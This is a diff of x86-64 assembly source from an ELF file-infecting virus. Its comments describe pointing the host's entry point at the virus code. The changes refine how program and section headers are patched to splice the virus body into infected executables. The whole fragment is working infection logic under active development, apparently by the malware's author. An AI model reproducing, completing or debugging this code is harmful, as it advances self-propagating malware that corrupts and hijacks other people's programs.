@@ -925,7 +925,7 @@ infect:
 					mov qword [r13 + 24], r10	; update ELF header entry point to point to virus code start
 					mov r10, [r13 + r12 + elf_phdr.p_offset] 
 					mov dword [hosttext_start], r10d
-					add r10, [r13 + r12 + elf_phdr.p_filesz]				
+					add r10, qword [r13 + r12 + elf_phdr.p_filesz]				
 					mov dword [vxoffset], r10d
 					add qword [r13 + r12 + elf_phdr.p_filesz], vlen	
 					add qword [r13 + r12 + elf_phdr.p_memsz], vlen
@@ -988,17 +988,22 @@ infect:
 			mov r11, [r13 + r15 + elf_shdr.sh_offset]
 			;cmp dword [r13 + r15 + elf_shdr.sh_offset], vxoffset
 			cmp dword r11d, [vxoffset]
-			jl .next_shdr
-			;jge .mod_subsequent_shdr
-			mov rdx, modvxshdrpass0len
-			lea rsi, modvxshdrpass0
-			mov rdi, STDOUT
-			mov rax, SYS_WRITE
-			syscall
-			mov r11, [r13 + r15 + elf_shdr.sh_addr]
-			add dword r11d, [r13 + r15 + elf_shdr.sh_size]
-			cmp dword r11d, vxoffset
-			jne .mod_subsequent_shdr
+			jge .mod_subsequent_shdr
+			;jl .next_shdr
+			jl .check_for_last_text_shdr
+			.check_for_last_text_shdr:
+				mov rdx, modvxshdrpass0len
+				lea rsi, modvxshdrpass0
+				mov rdi, STDOUT
+				mov rax, SYS_WRITE
+				syscall
+				mov r11, [r13 + r15 + elf_shdr.sh_addr]
+				;add dword r11d, [r13 + r15 + elf_shdr.sh_size]
+				add r11, qword [r13 + r15 + elf_shdr.sh_size]
+				;cmp dword r11d, [vxoffset]
+				cmp r11, [evaddr]
+				jne .next_shdr
+				;jne .mod_subsequent_shdr
 			.mod_last_text_section_shdr:
 				mov r10, [r13 + r15 + elf_shdr.sh_size]
 				add dword r10d, vlen
